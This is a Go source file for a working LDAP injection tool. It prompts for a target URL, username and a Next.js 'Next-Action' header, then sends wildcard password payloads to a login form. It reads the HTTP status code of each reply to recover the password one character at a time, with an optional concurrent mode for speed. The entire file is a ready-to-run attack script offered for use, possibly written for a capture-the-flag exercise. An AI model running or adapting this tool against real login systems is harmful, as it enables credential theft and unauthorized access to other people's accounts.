package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

type LdapInjector struct {
	Url             string
	Username        string
	Charset         string
	NextAction      string
	SuccessCode     int
	UseConcurrency  bool
	SleepPerRequest time.Duration
}

func NewLdapiInjector(
	url, username, nextAction string,
	successCode int,
	useConcurrency bool,
	sleepPerRequest time.Duration,
) *LdapInjector {
	return &LdapInjector{
		Url:             url,
		Username:        username,
		Charset:         CreateCharset(),
		NextAction:      nextAction,
		SuccessCode:     successCode,
		UseConcurrency:  useConcurrency,
		SleepPerRequest: sleepPerRequest,
	}
}

func (li *LdapInjector) TestPassword(password string) (bool, error) {
	payload := fmt.Sprintf(`1_ldap-username=%s&1_ldap-secret=%s&0=[{},"$K1"]`,
		li.Username, password)

	req, err := http.NewRequest("POST", li.Url, strings.NewReader(payload))
	if err != nil {
		return false, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Next-Action", li.NextAction)

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Timeout: 10 * time.Second,
	}

	resp, err := client.Do(req)

	time.Sleep(li.SleepPerRequest)

	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	return resp.StatusCode == li.SuccessCode, nil
}

func (li *LdapInjector) TestCharcter(prefix string) (string, error) {
	if !li.UseConcurrency {
		// === ПОСЛЕДОВАТЕЛЬНЫЙ РЕЖИМ ===
		for _, c := range li.Charset {
			testPwd := fmt.Sprintf("%s%s*", prefix, string(c))
			ok, err := li.TestPassword(testPwd)
			if err != nil {
				return "", err
			}
			if ok {
				return string(c), nil
			}
		}
		return "", nil
	} else {
		// === ПАРАЛЛЕЛЬНЫЙ (БЫСТРЫЙ) РЕЖИМ ===
		resultCh := make(chan string, 1)
		errCh := make(chan error, 1)

		var wg sync.WaitGroup
		for _, c := range li.Charset {
			wg.Add(1)
			go func(ch rune) {
				defer wg.Done()
				testPwd := fmt.Sprintf("%s%s*", prefix, string(ch))
				ok, err := li.TestPassword(testPwd)
				if err != nil {

					errCh <- err
					return
				}
				if ok {

					select {
					case resultCh <- string(ch):
					default:

					}
				}
			}(c)
		}

		go func() {
			wg.Wait()
			close(resultCh)
			close(errCh)
		}()

		select {
		case char, ok := <-resultCh:
			if ok {
				return char, nil
			}

			return "", nil
		case err, ok := <-errCh:
			if ok {
				return "", err
			}

			return "", nil
		}
	}
}

func (li *LdapInjector) Brute() (string, error) {
	var result string
	for {
		c, err := li.TestCharcter(result)
		if err != nil {
			return "", err
		}
		if c == "" {
			break
		}
		result += c
		fmt.Printf("Current prefix: %s\n", result)
	}
	return result, nil
}

func CreateCharset() string {
	var charset string
	for c := 'a'; c <= 'z'; c++ {
		charset += string(c)
	}
	for i := 0; i < 10; i++ {
		charset += strconv.Itoa(i)
	}
	return charset
}

func (li *LdapInjector) PruneCharset() error {
	var newCharset string
	for _, char := range li.Charset {
		testPwd := fmt.Sprintf("*%s*", string(char))
		ok, err := li.TestPassword(testPwd)
		if err != nil {
			return err
		}
		if ok {
			newCharset += string(char)
		}
	}
	li.Charset = newCharset
	return nil
}

func main() {
	reader := bufio.NewReader(os.Stdin)

	fmt.Println("Enter target URL: ")
	url, _ := reader.ReadString('\n')
	url = strings.TrimSpace(url)
	if url == "" {
		fmt.Println("Error: URL cannot be empty.")
		return
	}

	fmt.Println("Enter username: ")
	username, _ := reader.ReadString('\n')
	username = strings.TrimSpace(username)
	if username == "" {
		fmt.Println("Error: username cannot be empty.")
		return
	}

	fmt.Println("Enter Next-Action header: ")
	nextAction, _ := reader.ReadString('\n')
	nextAction = strings.TrimSpace(nextAction)

	fmt.Println("Enter success status code: ")
	codeStr, _ := reader.ReadString('\n')
	codeStr = strings.TrimSpace(codeStr)
	successCode, err := strconv.Atoi(codeStr)
	if err != nil {
		fmt.Println("Invalid status code. Using default 303.")
		successCode = 303
	}

	fmt.Println("Use concurrency for faster brute? (y/n):")
	useConcStr, _ := reader.ReadString('\n')
	useConcStr = strings.TrimSpace(useConcStr)
	useConcurrency := (useConcStr == "y" || useConcStr == "Y")

	sleepDuration := 200 * time.Millisecond

	c := NewLdapiInjector(url, username, nextAction, successCode, useConcurrency, sleepDuration)

	fmt.Printf("Initial Charset: %s\n", c.Charset)

	err = c.PruneCharset()
	if err != nil {
		fmt.Println("Error during PruneCharset:", err)
		return
	}
	fmt.Printf("Pruned Charset: %s\n", c.Charset)

	password, err := c.Brute()
	if err != nil {
		fmt.Println("Error during Brute:", err)
		return
	}
	fmt.Printf("Found password: %s\n", password)
}
